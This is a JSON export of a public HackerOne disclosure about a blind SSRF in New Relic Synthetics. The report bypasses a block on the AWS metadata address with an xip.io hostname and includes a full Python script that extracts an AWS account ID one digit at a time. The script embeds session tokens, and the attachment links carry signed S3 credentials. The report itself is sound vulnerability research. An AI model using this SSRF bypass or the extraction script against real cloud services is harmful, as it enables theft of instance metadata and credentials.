@@ -1,0 +1,468 @@
+{
+  "id": 141304,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDEzMDQ=",
+  "url": "https://hackerone.com/reports/141304",
+  "title": "Blind SSRF on synthetics.newrelic.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-05-26T21:34:59.173Z",
+  "submitted_at": "2016-05-26T21:34:59.173Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ylujion",
+    "url": "/ylujion",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/009/4b768d3628d874ff02edfb9b2dc4a42031141603_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17011,
+    "url": "https://hackerone.com/newrelic",
+    "handle": "newrelic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "New Relic",
+      "twitter_handle": "newrelic",
+      "website": "https://newrelic.com",
+      "about": "New Relic's Coordinated Disclosure Program"
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-09-05T07:25:24.196Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-09-05T07:25:24.027Z",
+  "team_member_agreed_on_going_public_at": "2016-08-26T23:32:17.972Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Introduction\n\nIt was possible to retrieve some data from the `http://169.254.169.254/latest/` URL corresponding to the [amazon instance metadatas](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html). With more time, we can dump the whole content.\n\n## PoC\n\nWhen creating a `Ping Monitor` on the `https://synthetics.newrelic.com/accounts/XXXXXXX/synthetics` URL, it is possible to check if a website is online and match for a string in the retrieved page.\n\nFirst I tried to create a `Ping Monitor` where the `Monitor URL` is set to `http://169.254.169.254/latest/dynamic/instance-identity/document` to see if we can access to this URL from on of the location available. For the PoC I used the `Dublin, IE` location. When trying this we get the following errors:\n {F96303}\n\nWe are not able to directly access the URL as it seems to be blocked. It was possible to bypass this by using [xip.io](http://xip.io/). It does the following as written on the web page:\n```\nWhat is xip.io?\nxip.io is a magic domain name that provides wildcard DNS\nfor any IP address. Say your LAN IP address is 10.0.0.1.\nUsing xip.io,\n\n          10.0.0.1.xip.io   resolves to   10.0.0.1\n      www.10.0.0.1.xip.io   resolves to   10.0.0.1\n   mysite.10.0.0.1.xip.io   resolves to   10.0.0.1\n  foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1\n\n...and so on. You can use these domains to access virtual\nhosts on your development web server from devices on your\nlocal network, like iPads, iPhones, and other computers.\nNo configuration required!\n```\n\nSo now we set our `Monitor URL` to `http://169.254.169.254.xip.io/latest/dynamic/instance-identity/document` and the file is successfully accessed:\n {F96304}\n\nWhen looking at [amazons documentation](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-identity-documents.html) we know how the `latest/dynamic/instance-identity/document` file is structured:\n```\n{\n  \"devpayProductCodes\" : null,\n  \"availabilityZone\" : \"us-east-1d\",\n  \"privateIp\" : \"10.158.112.84\",\n  \"version\" : \"2010-08-31\",\n  \"region\" : \"us-east-1\",\n  \"instanceId\" : \"i-1234567890abcdef0\",\n  \"billingProducts\" : null,\n  \"instanceType\" : \"t1.micro\",\n  \"accountId\" : \"123456789012\",\n  \"pendingTime\" : \"2015-11-19T16:32:11Z\",\n  \"imageId\" : \"ami-5fb8c835\",\n  \"kernelId\" : \"aki-919dcaf8\",\n  \"ramdiskId\" : null,\n  \"architecture\" : \"x86_64\"\n}\n```\n\nAs a PoC, we are going to retrieve the `accountId` value from the `Dublin, IE` amazon instance. For this purpose the following `python` script was created:\n```\n#!/usr/bin/python3\nimport requests\nimport json\nimport time\n\n#Charset that will be used to determine the accountId\nalpha_min = '0123456789'\n\n#Headers needed for some requests\nheaders = {'Accept': 'application/json'}\nheaders_put = {'Accept': 'application/json', 'Content-Type' : 'application/json;charset=UTF-8'}\n\n#Session cookie\ncookies = dict(login_service_login_newrelic_com_tokens = '%7B%22token%22%3A%22Y%2BhwhJQWlDb17uNTpQfnuPFA8bMsskQ6IgvuiSiiixS4GBbwE7xFB5F41Uqzb0tsHlpW9CukhUMWsXbUjZjpDrVDsLEZMxV1wZbhNb97LIkOCxDuDd6Nt32ggUJq1OYeYMojw0095ng50d6Zry%2FJfbnQUhVS2TdvP2jrLNXoikyq46FpL18fVOMnmQzEQ9r274FEIJSVr9AnVAGSW2rLa5G4tPF7BXh2GOaMgMCOH3ZjSpeRaIwKdOddc3pKFcTf6UP9CIb6tC91CXL16oU2wXXMX8D%2FNq6vIL21brVNi%2Fm8v5ocNX9aalnDsjmy01zb4XgaGzesdYYUDl6wmG4SGA%3D%3D%22%2C%22refresh_token%22%3A%22mCmVpRqqUpZpIyFDxMIyzaDlb6qTDt6obDVykOSqbrLslV45jrmGzWYIJoXcUgMSAkmhWcharI7TD9aEx0qh7uLz0u5llkjkzuyEtZLzNENBqKvIgaRYB7cCLWhfyc466rIEDn1z%2B%2FMb38cFuMLcR9V0USrvt%2FbGlSQhwbtcvb60KtSJ0f43e9DO9cIuEVT6KEV14Q6QeLT34rp9belSzOfvCA16VL9Jlb4eVktfVhQ4o0bKz0Js64bsaacEC7pSW58BeLqz4xUCiQYgh1SJp2lyG%2BYKooJBssHRbVu671KIiibwYI5fizivbtZD8eguXd9dTtxdhXMXigyOS9pR6w%3D%3D%22%7D')\n\n#Base URL\nurl = 'https://synthetics.newrelic.com'\n\n#URL suffixes of actions that will be used\nlatest_monitor = '/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd/results.json?includeFailed=true&locations=AWS_EU_WEST_1&locations=AWS_US_EAST_1&locations=LINODE_EU_WEST_1&orderBy=timestamp+desc&since=1363517150000&until=1564121950000'\njob = '/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd/results/REPLACEME/job'\nchange_settings = '/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd.json'\n\n#Requesting the current monitor\nr = requests.get(url + latest_monitor, cookies=cookies).json()\noriginal_id = r[0]['id']\n\n#String that will be filled\nto_find = ''\n\ncount = 0\nwhile(42):\n\tr = requests.get(url + latest_monitor, cookies=cookies).json()\n\ttmp_id = r[0]['id']\n\tprint(tmp_id)\n\tprint(original_id)\n\t#If the ID has changed, a new monitor state has arrived\n\tif original_id != tmp_id:\n\t\tr = requests.get(url + job.replace('REPLACEME', tmp_id), cookies=cookies, headers=headers).json()\n\t\tprint(r['URI'])\n\t\tprint(r['status'])\n\t\t#If the status of the monitor is set to SUCCESS, our \"Response validation\" string is matched and we store the found character and search for a new one\n\t\tif r['status'] == 'SUCCESS':\n\t\t\tto_find += alpha_min[count - 1]\n\t\t\tcount = 0\n\t\t#We configure our job with a new \"Response validation\" string\n\t\toriginal_id = tmp_id\n\t\turi = \"http://accountId\\\"+:+\\\"REPLACE@169.254.169.254.xip.io/latest/dynamic/instance-identity/document\".replace('REPLACE', alpha_min[count])\n\t\taccountid = \"accountId\\\" : \\\"\" + to_find + \"REPLACE\".replace('REPLACE', alpha_min[count])\n\t\tx = {\"id\":\"015101be-7318-452a-b210-1e4c443cc0fd\",\"name\":\"test\",\"accountId\":1340503,\"userId\":1616087,\"frequency\":1,\"uri\":uri,\"locations\":[\"AWS_EU_WEST_1\"],\"emails\":[],\"status\":\"ENABLED\",\"apiVersion\":\"0.2.2\",\"slaThreshold\":5,\"metadata\":{\"nr.synthetics.metadata.job.options.simple.bypass.head\":\"true\",\"nr.synthetics.metadata.job.options.response-validation\":accountid},\"conditions\":[],\"type\":\"SIMPLE\",\"permissions\":{\"monitor/read\":\"true\",\"monitor/write\":\"true\"},\"crc\":1899546310,\"currentChecks\":43200}\n\t\tr = requests.put(url + change_settings, data=json.dumps(x), cookies=cookies, headers=headers_put)\n\t\tprint(r.text)\n\t\tcount += 1\n\t#We sleep for 30 seconds as the jobs are received every 1 minute\n\ttime.sleep(30)\n```\n\nWhat we do with this script is:\n+ we create a `Response validation` string matching `accountId\" : \"` on the `Monitor URL` set to  `http://169.254.169.254.xip.io/latest/dynamic/instance-identity/document` ;\n+ we the add a single character to the `Response validation` string from our numeric charset string and wait one minute ;\n+ when a new job has been done, we check if the `status` is `FAILURE` or `SUCCESS`. If it is `FAILURE` we try another single character from our numeric charset, if it is `SUCCESS` we matched a new valid character, add it to our `Response validation` string and search for the next character.\n+ we do this until our script fails as no more numeric characters are to be found.\n\nBy using this string we could determine the value of the `accountId` is `017663287629` in the `latest/dynamic/instance-identity/document` file of the `Dublin, IE` instance.\n\nWe could then use the same methodology to dump all files accessible through this URL. For example the `/latest/user-data` file is containing a script. It is also accessible and by checking the same way with the `Response validation` set to `/bin/` was successfully matched through a `monitor`.\n\n## Risks\n\nAn attacker would be able to dump all the information contained in the `/latest/` folder of the amazon instance.\n\n## Mitigation\n\n+ Do not let it be possible to access the `169.254.169.254` IP address from a monitor.\n\n## Comments\n\nI did not take the time to make a more deeper script that could use multiple `monitors` to communicate between them to dump data faster but it can be done.\n\nI hope I didn't forget any important step to exploit this. It is quite difficult to exploit and to explain. Please let me know if you need any further information.\n\nRegards.\n",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 96303,
+      "file_name": "1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/096/303/49bf69cee7f54f5fb4f77957c7f1910d2ef7c7ef/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5PYIVGUM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T081511Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJHMEUCIQCxbKVFfwxvn2aMDuXVLe1QzQK3TCJpdEoanp1JuiXzCgIgLG404Fpz8ZdPE%2BVxOGyXkaneEtoAwPvWzebl2kOqeJoqsQUIKRADGgwwMTM2MTkyNzQ4NDkiDNffnc3v799tsQTD4CqOBWdOP%2BfWq5y3voATniH3LEZIyCon5M%2BAmx0Zm37wkxRFF%2FGkbHL3PJgkI%2B%2FW9YgllfnrqRSyjZfMg%2BTDyRA8F75E6xAHAd8tlxenAYYgPBc2Dhc10X5ihoe3kwtwp19Wx0D7ueWQP8WZaoCaIhS2IvaPsTRktad2Ktwh9UAa3S8SoD1%2FsOiixEVomorIRINMrfb5oKlJkxrMIJDUXq4Aw%2B0RvXG%2FtwAeVTAJ3yBLxBuNWln%2B7EAJYVeHBtYlSzj4tCTJYjTlXtd7lcxJ1sT4GXVQI%2BGcHuZmdCJA4oZf0z%2FZxRJEV6hSqncwVJnLfvHolXneHrT%2BXXcikChEhjO5HFl%2FkTXo2GYWiWUvGHcmJKjvLeJ8XHI%2FKv6b2mX75Z5yw1BdwAp1xl2CTJV2gO3CR9QODsl5mRi8ahtEHG7fNwG1p%2F9YuaVJYfpuP4Feni90I3zw3%2B125VtZ44CRAtbFs4unZlyKY3PMJXc57Rcxfe3zsUP4I5MnViqXBHRmG%2FbHd2X2JKW1302xUa5cpZgFTD8W9CqfDkw1e%2FGDSSftnTeY4oKYb3HcCiFq5dkdKw%2FzMlT%2BB1QBKKiuc%2FvFGwnfmKB4lNNJa%2FN8NwKD7AaLKAzbHNr4OZvnFLS9hi%2B1e2dRmU1sV3LJs6XFeaP1JhazIFAoyQKcFOFC02TgXs8J3H2cED2GpEGT4U%2BfRmNZajta8lvt1npglMNITLcS3AuAJHkqfC6ILLXZOhwBT4Mx2o%2BLQkmtdPnTGHBCv7xvHoJ5cLFwINIuuMxbBL6PgRjU2lsln6AwdKTaLJvpfjkSH9b%2Bce9wesNIXxAywsTFMlk1bbfxl54y5eYq5lS%2FTa1U%2BG9rL8OsVzxzJ5hrftXJkjDTqrqoBjqxARQvnFu2w0Y14KlU4OBcpKuBHgzD3VkvYuMrn2OwVRTK1BsM8eGnFJy3RMGIyvD3HxaV91qaLN6dJyWbWdFNjJUpVZZAZhSewXXr4iDQtR49zDh1kW%2BZ79UTOWlipVMpq05B2bgf%2BRpW5mvBV7A3o1UYWNTTyRAaEuMJGFPe%2BjNeLFL9KIMEBPbvxeLdMzzfZcVvy7s54UQ8C5hdT3QZ0MY3WW5ab3CN8d5Ntn1fJlIuoA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=607f1ec2252b6ccb85745897149bbef5d3bde443b70646997d00543ec77ead51",
+      "file_size": 71350,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 96304,
+      "file_name": "2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/096/304/da1889b55de70954128b65d55884c1abbaedf263/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5PYIVGUM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T081511Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJHMEUCIQCxbKVFfwxvn2aMDuXVLe1QzQK3TCJpdEoanp1JuiXzCgIgLG404Fpz8ZdPE%2BVxOGyXkaneEtoAwPvWzebl2kOqeJoqsQUIKRADGgwwMTM2MTkyNzQ4NDkiDNffnc3v799tsQTD4CqOBWdOP%2BfWq5y3voATniH3LEZIyCon5M%2BAmx0Zm37wkxRFF%2FGkbHL3PJgkI%2B%2FW9YgllfnrqRSyjZfMg%2BTDyRA8F75E6xAHAd8tlxenAYYgPBc2Dhc10X5ihoe3kwtwp19Wx0D7ueWQP8WZaoCaIhS2IvaPsTRktad2Ktwh9UAa3S8SoD1%2FsOiixEVomorIRINMrfb5oKlJkxrMIJDUXq4Aw%2B0RvXG%2FtwAeVTAJ3yBLxBuNWln%2B7EAJYVeHBtYlSzj4tCTJYjTlXtd7lcxJ1sT4GXVQI%2BGcHuZmdCJA4oZf0z%2FZxRJEV6hSqncwVJnLfvHolXneHrT%2BXXcikChEhjO5HFl%2FkTXo2GYWiWUvGHcmJKjvLeJ8XHI%2FKv6b2mX75Z5yw1BdwAp1xl2CTJV2gO3CR9QODsl5mRi8ahtEHG7fNwG1p%2F9YuaVJYfpuP4Feni90I3zw3%2B125VtZ44CRAtbFs4unZlyKY3PMJXc57Rcxfe3zsUP4I5MnViqXBHRmG%2FbHd2X2JKW1302xUa5cpZgFTD8W9CqfDkw1e%2FGDSSftnTeY4oKYb3HcCiFq5dkdKw%2FzMlT%2BB1QBKKiuc%2FvFGwnfmKB4lNNJa%2FN8NwKD7AaLKAzbHNr4OZvnFLS9hi%2B1e2dRmU1sV3LJs6XFeaP1JhazIFAoyQKcFOFC02TgXs8J3H2cED2GpEGT4U%2BfRmNZajta8lvt1npglMNITLcS3AuAJHkqfC6ILLXZOhwBT4Mx2o%2BLQkmtdPnTGHBCv7xvHoJ5cLFwINIuuMxbBL6PgRjU2lsln6AwdKTaLJvpfjkSH9b%2Bce9wesNIXxAywsTFMlk1bbfxl54y5eYq5lS%2FTa1U%2BG9rL8OsVzxzJ5hrftXJkjDTqrqoBjqxARQvnFu2w0Y14KlU4OBcpKuBHgzD3VkvYuMrn2OwVRTK1BsM8eGnFJy3RMGIyvD3HxaV91qaLN6dJyWbWdFNjJUpVZZAZhSewXXr4iDQtR49zDh1kW%2BZ79UTOWlipVMpq05B2bgf%2BRpW5mvBV7A3o1UYWNTTyRAaEuMJGFPe%2BjNeLFL9KIMEBPbvxeLdMzzfZcVvy7s54UQ8C5hdT3QZ0MY3WW5ab3CN8d5Ntn1fJlIuoA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6e9f7551e50bfca9664b6f97fee25844f4b0297b47e2557ebd15489d616d3306",
+      "file_size": 136796,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-09-25T23:32:18.028Z",
+  "allow_singular_disclosure_after": -220610573.81454572,
+  "singular_disclosure_allowed": true,
+  "vote_count": 13,
+  "voters": [
+    "michiel",
+    "jon_bottarini",
+    "skavans",
+    "faloker",
+    "ylujion",
+    "f_m",
+    "muhammad_uwais",
+    "nicknam3",
+    "omega",
+    "cryptographer",
+    "and 3 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 988534,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for this awesome report, ylujion ! Your thoroughness and detailed writeup is really appreciated. We'll file it with the appropriate engineering team and start working on a fix. ",
+      "automated_response": false,
+      "created_at": "2016-05-27T23:25:15.574Z",
+      "updated_at": "2016-05-27T23:25:15.574Z",
+      "actor": {
+        "username": "imelven",
+        "cleared": false,
+        "verified": false,
+        "url": "/imelven",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/036/153/809e507ea6cd7c5c120920d1d4ce70336974d422_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 993282,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2016-05-31T18:30:06.668Z",
+      "updated_at": "2016-05-31T18:30:06.668Z",
+      "actor": {
+        "username": "mlapworth",
+        "cleared": false,
+        "verified": false,
+        "url": "/mlapworth",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/037/133/217dcc39c148da22068b3c64788e88e89c7cfe21_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 993289,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi ylujion,\n\nWe're filed an issue with the development team. We'll update you here as we have additional questions and when the fix becomes available for you to re-test. \n\nThank you,\nMatthew",
+      "automated_response": false,
+      "created_at": "2016-05-31T18:32:34.880Z",
+      "updated_at": "2016-05-31T18:32:34.880Z",
+      "actor": {
+        "username": "mlapworth",
+        "cleared": false,
+        "verified": false,
+        "url": "/mlapworth",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/037/133/217dcc39c148da22068b3c64788e88e89c7cfe21_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 996881,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi ylujion,\n\nThe team has pushed a fix for this issue and the other you reported. Can you take a look and see if the issue(s) have been resolved?\n\nThanks,\nMatthew",
+      "automated_response": false,
+      "created_at": "2016-06-02T16:06:39.798Z",
+      "updated_at": "2016-06-02T16:06:39.798Z",
+      "actor": {
+        "username": "mlapworth",
+        "cleared": false,
+        "verified": false,
+        "url": "/mlapworth",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/037/133/217dcc39c148da22068b3c64788e88e89c7cfe21_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 996904,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I had the monitor still up, so I can tell that since yesterday I am not able to access the URL anymore.\n\nI still tried with other different service`xip.io` and `nip.io` to ensure that not only `xip.io` was blacklisted.\n\nRegards.\n",
+      "automated_response": false,
+      "created_at": "2016-06-02T16:20:11.890Z",
+      "updated_at": "2016-06-02T16:20:11.890Z",
+      "actor": {
+        "username": "ylujion",
+        "cleared": false,
+        "verified": false,
+        "url": "/ylujion",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/009/4b768d3628d874ff02edfb9b2dc4a42031141603_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 996928,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Thank you for helping us keep New Relic's customers secure! I'll be closing out this report and 141682. ",
+      "automated_response": false,
+      "created_at": "2016-06-02T16:38:53.543Z",
+      "updated_at": "2016-06-02T16:38:53.543Z",
+      "actor": {
+        "username": "mlapworth",
+        "cleared": false,
+        "verified": false,
+        "url": "/mlapworth",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/037/133/217dcc39c148da22068b3c64788e88e89c7cfe21_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "ylujion",
+        "url": "/ylujion"
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 1157059,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2016-08-26T23:32:18.005Z",
+      "updated_at": "2016-08-26T23:32:18.005Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "imelven",
+        "cleared": false,
+        "verified": false,
+        "url": "/imelven",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/036/153/809e507ea6cd7c5c120920d1d4ce70336974d422_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 1170655,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@ylujion I've added a summary and set disclosure to limited for this issue. Thanks again !",
+      "automated_response": false,
+      "created_at": "2016-09-02T21:32:03.798Z",
+      "updated_at": "2016-09-02T21:32:03.798Z",
+      "actor": {
+        "username": "imelven",
+        "cleared": false,
+        "verified": false,
+        "url": "/imelven",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/036/153/809e507ea6cd7c5c120920d1d4ce70336974d422_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 1173085,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2016-09-05T07:25:24.086Z",
+      "updated_at": "2016-09-05T07:25:24.086Z",
+      "actor": {
+        "username": "ylujion",
+        "cleared": false,
+        "verified": false,
+        "url": "/ylujion",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/009/4b768d3628d874ff02edfb9b2dc4a42031141603_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 1173086,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2016-09-05T07:25:24.226Z",
+      "updated_at": "2016-09-05T07:25:24.226Z",
+      "actor": {
+        "username": "ylujion",
+        "cleared": false,
+        "verified": false,
+        "url": "/ylujion",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/009/4b768d3628d874ff02edfb9b2dc4a42031141603_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 1173208,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "You could have fully disclosed this one by the way as it does not disclose any sensitive information like the other one. Maybe if it is possible to change it as it is quite interesting.",
+      "automated_response": false,
+      "created_at": "2016-09-05T07:55:09.852Z",
+      "updated_at": "2016-09-05T07:55:09.852Z",
+      "actor": {
+        "username": "ylujion",
+        "cleared": false,
+        "verified": false,
+        "url": "/ylujion",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/009/4b768d3628d874ff02edfb9b2dc4a42031141603_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 1174731,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@ylujion fully disclosed - I didn't read closely enough and see that the details were from Amazon's docs. Thanks again, as always appreciate the help to do our best with this program ! ",
+      "automated_response": false,
+      "created_at": "2016-09-05T17:10:18.489Z",
+      "updated_at": "2016-09-05T17:10:18.489Z",
+      "actor": {
+        "username": "imelven",
+        "cleared": false,
+        "verified": false,
+        "url": "/imelven",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/036/153/809e507ea6cd7c5c120920d1d4ce70336974d422_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 2694233,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::NotEligibleForBounty",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-05-03T03:29:45.606Z",
+      "updated_at": "2018-05-03T03:29:45.606Z",
+      "actor": {
+        "url": "/newrelic",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "New Relic"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "id": 2572,
+      "category": "team",
+      "content": "ylujion reported to us that it was possible to conduct a blind SSRF attack against Synthetics. This attack could be used to obtain various sensitive data about the server on which the Synthetics monitor is running. The report was particularly clever because access to the IP in question was explicitly blocked by Synthetics - but ylujion also found a way to bypass this block. ",
+      "user": {
+        "id": 36153,
+        "username": "imelven",
+        "name": "Ian Melven",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://twitter.com/imelven",
+        "location": "Portland OR USA",
+        "created_at": "2015-07-07T16:47:18.858Z",
+        "url": "https://hackerone.com/imelven",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/036/153/809e507ea6cd7c5c120920d1d4ce70336974d422_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/036/153/809e507ea6cd7c5c120920d1d4ce70336974d422_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89",
